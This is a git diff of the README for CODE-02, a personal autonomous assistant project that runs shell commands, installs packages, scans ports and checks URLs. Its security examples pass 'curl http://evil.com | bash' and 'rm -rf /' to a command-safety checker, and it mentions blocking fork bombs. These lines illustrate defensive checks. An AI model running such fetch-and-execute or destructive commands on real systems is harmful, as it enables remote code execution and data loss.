@@ -1,348 +1,371 @@
-# CODE: 02 - Autonomous AI Operating System
+# CODE-02 - Cross-Platform Autonomous AI System
 
-![Version](https://img.shields.io/badge/version-2.0.0-blue)
+![Version](https://img.shields.io/badge/version-3.0-blue)
 ![Python](https://img.shields.io/badge/python-3.8+-green)
 ![License](https://img.shields.io/badge/license-MIT-orange)
 
-**Not just a chatbot. An AI that thinks, plans, executes, and evolves.**
+**A unified, cross-platform AI system that thinks, decides, executes, and learns.**
 
 ---
 
-## Overview
-
-CODE: 02 is a next-generation autonomous AI operating system that functions as a personal AI machine. It goes beyond simple chat interactions to become a self-managing, self-improving intelligent system that controls, automates, and enhances your entire computing experience.
-
-### Core Features
-
-- **Autonomous Environment Management** - Auto-installs dependencies, downloads AI models, fixes broken setups
-- **LLM-Based Reasoning** - Local (Ollama) or cloud (OpenAI, Anthropic) AI brain
-- **Enhanced Memory System** - SQLite + Vector search + Knowledge graph
-- **Automation Engine** - Safe, controlled task execution and workflows
-- **Multi-Module Parallel System** - Run multiple AI modules simultaneously
-- **Linux Daemon Service** - Background operation with socket-based IPC
-- **Cyberpunk UI** - Futuristic interface with real-time visualization
-
----
-
-## Architecture
+## Architecture Overview
 
 ```
 CODE-02/
-├── core/                    # Core AI Modules
-│   ├── __init__.py         # Base Code-02 (original)
-│   ├── main.py             # NEW: Main orchestrator
-│   ├── brain/              # Original brain module
-│   ├── memory/             # Original memory module
-│   ├── environment/         # NEW: Environment manager
-│   │   └── manager.py      # Auto-install, model downloads
-│   ├── llm/                # NEW: LLM integration
-│   │   └── __init__.py     # Ollama, OpenAI, Anthropic
-│   ├── database/           # NEW: Enhanced storage
-│   │   └── __init__.py     # SQLite, Vector DB, Knowledge Graph
-│   ├── automation/          # NEW: Task execution
-│   │   └── __init__.py     # Safe execution, workflows
-│   ├── planning/           # Original planning
-│   ├── tools/              # Original tools
-│   ├── agents/             # Original multi-agent
-│   ├── learning/           # Original learning loop
-│   └── voice/              # Original voice
-├── services/               # Background services
-│   └── code02d.py          # Linux daemon
-├── api/                   # Flask REST API
-├── ui/                    # React web UI
-├── ui-electron/           # NEW: Electron desktop app
-└── data/                  # Data storage
+├── core/
+│   ├── platform/          # OS Detection
+│   │   └── detect.py     # Windows, Linux, macOS detection
+│   │
+│   ├── automation/        # Cross-Platform Command Execution
+│   │   ├── base.py       # Abstract interface
+│   │   ├── linux.py      # bash, systemctl, pacman/apt
+│   │   └── windows.py    # PowerShell, CMD, winget
+│   │
+│   ├── installer/        # Cross-Platform Package Management
+│   │   └── __init__.py   # pacman/apt/pip (Linux) / pip/npm (Windows)
+│   │
+│   ├── cybersecurity/    # Security Operations
+│   │   └── __init__.py  # Port scanner, phishing detection
+│   │
+│   ├── datascience/      # ML-Based Intelligence
+│   │   └── __init__.py  # Intent classifier, preprocessing
+│   │
+│   ├── smart_ai/        # Main Controller
+│   │   └── __init__.py  # listen→understand→decide→execute→learn
+│   │
+│   ├── unified/         # Unified Main Loop
+│   │   └── __init__.py  # Cross-platform orchestration
+│   │
+│   ├── brain/           # Original brain module
+│   ├── memory/          # Memory systems
+│   ├── planning/        # Planning engine
+│   ├── tools/           # Tool registry
+│   ├── agents/          # Multi-agent system
+│   ├── learning/        # Learning loop
+│   └── voice/           # Voice interaction
+│
+├── services/            # Background services
+│   └── code02d.py      # Linux daemon
+│
+├── ui/                 # Web UI (React)
+├── api/                # REST API
+└── data/               # Data storage
 ```
 
----
+## Quick Start
 
-## Installation
-
-### Quick Start (Linux/Arch)
+### Installation
 
 ```bash
-# Clone repository
 git clone https://github.com/manojkumar20081604-lang/Code-02.git
 cd Code-02/CODE-02
-
-# Install dependencies
 pip install -r requirements.txt
-
-# Install Ollama (for local AI)
-curl -fsSL https://ollama.com/install.sh | sh
-ollama pull llama3.2
-
-# Run Code-02
-python core/main.py
 ```
 
-### Full Setup
+### Run the System
 
 ```bash
-# Install system dependencies
-sudo pacman -S python python-pip git curl wget
+# Option 1: Smart AI (with ML + Security)
+python -c "import asyncio; from core.smart_ai import SmartAI; asyncio.run(SmartAI().run())"
 
-# Install Python packages
-pip install flask flask-cors fastapi uvicorn sqlalchemy aiosqlite aiohttp
+# Option 2: Unified (cross-platform)
+python -c "import asyncio; from core.unified import Code02Unified; asyncio.run(Code02Unified().run())"
 
-# Install AI packages
-pip install langchain langchain-community chromadb transformers
-
-# Install optional packages
-pip install ollama redis  # For enhanced features
-
-# Start daemon (optional)
-python services/code02d.py start
-```
-
----
-
-## Usage
-
-### Interactive Mode
-
-```bash
-python core/main.py
-```
-
-```
-CODE: 02 - Autonomous AI Operating System
-==================================================
-
-System initialized
-  [✓] LLM Brain: online (ollama/llama3.2)
-  [✓] Memory: online (125 memories, 48 vectors)
-  [✓] Automation: online (safe mode)
-  [✓] Environment: online (arch linux)
-
-Ready! Type 'help' for commands.
-
-Code-02> hello
-Hello! I'm CODE: 02, your autonomous AI system.
-
-Code-02> exec ls -la
-Status: completed
-(total files...)
-
-Code-02> install numpy
-Success: True
-
-Code-02> think about building a web scraper
-[Deep thinking output...]
-```
-
-### Daemon Mode (Background)
-
-```bash
-# Start daemon
-python services/code02d.py start
-
-# Send commands
-python services/code02d.py status
-
-# Client example
-python -c "
-from services.code02d import Code02Client
-client = Code02Client()
-print(client.status())
-print(client.process('Hello'))
-"
-
-# Stop daemon
-python services/code02d.py stop
-```
-
-### Python API
-
-```python
-import asyncio
-from core.main import get_code02_os
-
-async def main():
-    code02 = get_code02_os()
-    await code02.initialize()
-    
-    # Chat with AI
-    response = await code02.process("Build me a Python web server")
-    print(response['response'])
-    
-    # Execute command
-    result = await code02.execute_task("ls -la")
-    print(result['stdout'])
-    
-    # Install dependency
-    await code02.install_dependency("flask>=2.3")
-    
-    # Deep thinking
-    thought = await code02.think("How do I build a REST API?")
-    print(thought['reasoning'])
-    
-    # System status
-    print(code02.get_system_status())
-
-asyncio.run(main())
+# Option 3: Interactive launcher
+./launch.sh
 ```
 
 ---
 
 ## Module Details
 
-### 1. Environment Manager
+### 1. Platform Detection (`core/platform/`)
 
-Automatically manages your computing environment:
-- Detects missing dependencies
-- Installs packages (pacman, apt, pip, npm, cargo)
-- Downloads AI models (Ollama, HuggingFace)
-- Fixes broken setups automatically
+Automatically detects operating system at runtime.
 
 ```python
-env = get_env_manager()
+from core.platform import get_os, is_linux, is_windows
 
-# Check dependencies
-missing = await env.check_dependencies(["pip:flask", "npm:electron"])
-print(missing)  # {'flask': True, 'electron': False}
+os_info = get_os()
+print(f"Platform: {os_info}")           # windows, linux/arch, linux/debian
+print(f"Is Linux: {os_info.is_linux}")  # True/False
+print(f"Is Windows: {os_info.is_windows}")
 
-# Auto-install
-result = await env.install("python-numpy")
-print(result.success)
-
-# Download AI model
-result = await env.download_ai_model("llama3.2", "ollama")
+# Get capabilities
+caps = os_info.get_capabilities()
+print(caps["capabilities"])  # List of available features
 ```
 
-### 2. LLM Brain
+### 2. Cross-Platform Automation (`core/automation/`)
 
-Intelligent AI reasoning with multiple backends:
+Same interface for all platforms.
 
 ```python
-# Create LLM brain
-llm = create_llm_brain(provider="ollama", model="llama3.2")
-await llm.initialize()
+from core.automation import get_automation
 
-# Generate response
-response = await llm.generate("Write a Python function")
-print(response.text)
+# Auto-selects Linux or Windows implementation
+automation = get_automation()
 
-# Deep thinking
-thought = await llm.think("How does blockchain work?", method="chain_of_thought")
-print(thought['reasoning'])
+# Execute commands
+result = automation.execute("ls -la")
+print(f"Success: {result.success}")
+print(f"Output: {result.stdout}")
+print(f"Exit code: {result.exit_code}")
+
+# Get system info
+info = automation.get_system_info()
+print(info)
 ```
 
-### 3. Enhanced Memory
+### 3. Cross-Platform Installer (`core/installer/`)
 
-Multi-layer memory with search capabilities:
+Auto-detects package manager and installs.
 
 ```python
-memory = get_enhanced_memory()
+from core.installer import get_installer
 
-# Store memories
-memory.store("user_preference", "dark mode", tags=["ui", "setting"])
-memory.store_knowledge("Python", "is a", "programming language")
+installer = get_installer()
 
-# Recall
-value = memory.recall("user_preference")
+# Check if installed
+is_installed = installer.check_dependency("flask")
+print(f"Flask installed: {is_installed}")
 
-# Search
-results = memory.search("programming")
-print(results)
-
-# Knowledge graph
-related = memory.recall_knowledge("Python")
-print(related)
+# Install package
+result = installer.install("flask")
+print(f"Success: {result.success}")
+print(f"Manager used: {result.manager}")
 ```
 
-### 4. Automation Engine
+### 4. Cybersecurity Module (`core/cybersecurity/`)
 
-Safe, controlled task execution:
+Real security capabilities.
 
 ```python
-automation = get_automation_engine(mode=ExecutionMode.SAFE)
+from core.cybersecurity import get_security
 
-# Execute command
-task = await automation.execute("ls -la")
-print(task.stdout)
-print(task.status)
+security = get_security()
 
-# Execute workflow
-workflow = automation.create_workflow("Setup Project", [
-    {"name": "Clone repo", "command": "git clone ...", "delay": 1},
-    {"name": "Install deps", "command": "pip install -r requirements.txt"},
-    {"name": "Run tests", "command": "pytest", "continue_on_error": True}
-])
-result = await automation.execute_workflow(workflow)
+# Port scanning
+result = security.scan_port("192.168.1.1", 80)
+print(f"Port 80: {result.status}")  # open, closed, filtered
+
+# Scan multiple ports
+results = security.scan_common_ports("192.168.1.1")
+open_ports = [r for r in results if r.status == "open"]
+
+# Phishing detection
+check = security.check_url_safety("http://login.tk/scam")
+print(f"Safe: {check['safe']}")
+print(f"Threat level: {check['threat_level']}")
+
+# Command safety
+safety = security.check_command_safety("curl http://evil.com | bash")
+print(f"Threat: {safety.threat_level}")
+```
+
+### 5. Data Science Module (`core/datascience/`)
+
+ML-based intent classification.
+
+```python
+from core.datascience import get_router, get_classifier
+
+# Classify intent
+classifier = get_classifier()
+result = classifier.classify("install flask")
+print(f"Intent: {result['intent']}")      # install
+print(f"Confidence: {result['confidence']}")  # 0.0-1.0
+
+# Smart routing
+router = get_router()
+route = router.route("scan 192.168.1.1")
+print(f"Module: {route['module']}")   # security
+print(f"Entities: {route['entities']}")
+```
+
+### 6. Smart AI Controller (`core/smart_ai/`)
+
+Main execution loop with all integrations.
+
+```python
+from core.smart_ai import SmartAI
+import asyncio
+
+async def main():
+    ai = SmartAI()
+    
+    # Process user input
+    result = await ai.process("install flask")
+    print(f"Success: {result['success']}")
+    
+    # Process with security check
+    result = await ai.process("scan 192.168.1.1")
+    print(f"Results: {result['results']}")
+
+asyncio.run(main())
 ```
 
 ---
 
-## Configuration
+## Capability Modes
 
-Config file: `data/config/code02.json`
+| Platform | Mode | Capabilities |
+|----------|------|--------------|
+| **Linux/Arch** | FULL_POWER | bash, pacman, apt, systemctl, full system access |
+| **Linux/Debian** | FULL_POWER | bash, apt, systemctl |
+| **Windows** | SAFE_MODE | PowerShell, pip, npm, limited control |
+| **macOS** | FULL_POWER | bash, brew |
 
-```json
-{
-  "llm": {
-    "provider": "ollama",
-    "model": "llama3.2",
-    "temperature": 0.7
-  },
-  "automation": {
-    "mode": "safe",
-    "timeout": 60
-  },
-  "memory": {
-    "data_dir": "data/memory",
-    "auto_cleanup_days": 30
-  },
-  "environment": {
-    "auto_install": true
-  }
-}
+## Smart Processing Pipeline
+
+```
+User Input
+    ↓
+[1] Text Preprocessing (clean, tokenize, extract features)
+    ↓
+[2] Intent Classification (ML-based)
+    ↓
+[3] Security Check (command, URL, file safety)
+    ↓
+[4] Module Routing (automation, installer, security, brain)
+    ↓
+[5] Execution (OS-specific implementation)
+    ↓
+[6] Data Collection (log for learning)
+    ↓
+Output
 ```
 
----
+## Security Features
 
-## API Endpoints
+- **Port Scanning**: Scan common ports, assess threats
+- **Phishing Detection**: Pattern matching, suspicious TLDs
+- **Command Safety**: Blocks dangerous commands (rm -rf /, fork bombs)
+- **External IP Blocking**: Prevents unauthorized external scanning
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/chat` | POST | Process message |
-| `/api/execute` | POST | Execute command |
-| `/api/status` | GET | System status |
-| `/api/memory` | GET/POST | Memory operations |
-| `/api/think` | POST | Deep thinking |
-| `/api/install` | POST | Install package |
-| `/api/think` | POST | Deep thinking |
+## ML Features
+
+- **Intent Classification**: command, install, security, network, file, system, think, help, chat
+- **Entity Extraction**: packages, commands, URLs, IPs, ports
+- **Data Collection**: Logs interactions for training
+- **Feature Extraction**: Pattern matching, keyword detection
+
+## Examples
+
+### Example 1: Check System Platform
+```python
+from core.platform import get_os
+
+os_info = get_os()
+print(f"You're running: {os_info}")
+```
+
+### Example 2: Execute Commands
+```python
+from core.automation import get_automation
+
+auto = get_automation()
+result = auto.execute("echo 'Hello from CODE-02!'")
+print(result.stdout)
+```
+
+### Example 3: Security Scan
+```python
+from core.cybersecurity import get_security
+
+sec = get_security()
+result = sec.scan_common_ports("192.168.1.1")
+open_ports = [r for r in result if r.status == "open"]
+print(f"Open ports: {[r.port for r in open_ports]}")
+```
+
+### Example 4: Check URL Safety
+```python
+from core.cybersecurity import get_security
+
+sec = get_security()
+check = sec.check_url_safety("http://fake-login.tk/verify")
+print(f"Threat level: {check['threat_level']}")
+```
+
+### Example 5: Classify Intent
+```python
+from core.datascience import get_router
+
+router = get_router()
+result = router.route("install nmap on this machine")
+print(f"Intent: {result['intent']}")  # install
+print(f"Module: {result['module']}")  # installer
+```
+
+### Example 6: Full Smart Processing
+```python
+from core.smart_ai import SmartAI
+import asyncio
+
+async def demo():
+    ai = SmartAI()
+    
+    # Safe command
+    result = await ai.process("ls -la")
+    print(f"Result: {result['success']}")
+    
+    # Install package
+    result = await ai.process("install flask")
+    print(f"Installed: {result.get('results', [])}")
+    
+    # Security check (blocked)
+    result = await ai.process("rm -rf /")
+    print(f"Blocked: {not result['success']}")
+
+asyncio.run(demo())
+```
 
 ---
 
 ## System Requirements
 
-- **OS**: Linux (Arch, Debian, Fedora), macOS, Windows
 - **Python**: 3.8+
+- **OS**: Linux, Windows, macOS
 - **RAM**: 4GB minimum (8GB recommended)
-- **Disk**: 2GB for models + dependencies
 
-### Optional
-- **Ollama**: For local AI models
-- **Node.js**: For UI development
-- **Redis**: For caching (optional)
+### Optional Dependencies
+- **psutil**: For process management (`pip install psutil`)
+- **Ollama**: For local LLM (`curl -fsSL https://ollama.com/install.sh | sh`)
 
 ---
 
-## Development Roadmap
+## Development
 
-- [x] Core AI Brain (Intent, Planning, Memory)
-- [x] Multi-Agent System
-- [x] Voice Interaction
-- [x] LLM Integration (Ollama, OpenAI, Anthropic)
-- [x] Enhanced Memory (Vector DB, Knowledge Graph)
-- [x] Automation Engine
-- [x] Environment Manager
-- [x] Linux Daemon Service
-- [ ] Electron Desktop UI
-- [ ] Plugin System
-- [ ] Multi-user Support
-- [ ] Mobile Companion App
+### Run Tests
+```bash
+cd CODE-02
+
+# Test platform detection
+python -c "from core.platform import get_os; print(get_os())"
+
+# Test automation
+python -c "from core.automation import get_automation; r=get_automation().execute('echo test'); print(r.success)"
+
+# Test smart AI
+python -c "import asyncio; from core.smart_ai import SmartAI; asyncio.run(SmartAI().run())"
+```
+
+### Project Structure
+```
+CODE-02/
+├── core/               # Main modules
+│   ├── platform/      # OS detection
+│   ├── automation/    # Command execution
+│   ├── installer/     # Package management
+│   ├── cybersecurity/ # Security features
+│   ├── datascience/   # ML classification
+│   └── smart_ai/     # Main controller
+├── services/          # Background services
+├── api/              # REST API
+├── ui/               # Frontend
+└── data/             # Data storage
+```
 
 ---
 
@@ -357,7 +380,7 @@ Config file: `data/config/code02.json`
 
 ## License
 
-MIT License - See LICENSE file
+MIT License
 
 ---
 
@@ -368,4 +391,4 @@ B.Tech AI & Data Science
 
 ---
 
-*"CODE: 02 - Not just a chatbot, but a thinking partner and autonomous AI machine."*
+*"CODE-02 - A unified, cross-platform AI system that thinks, decides, executes, and learns."*
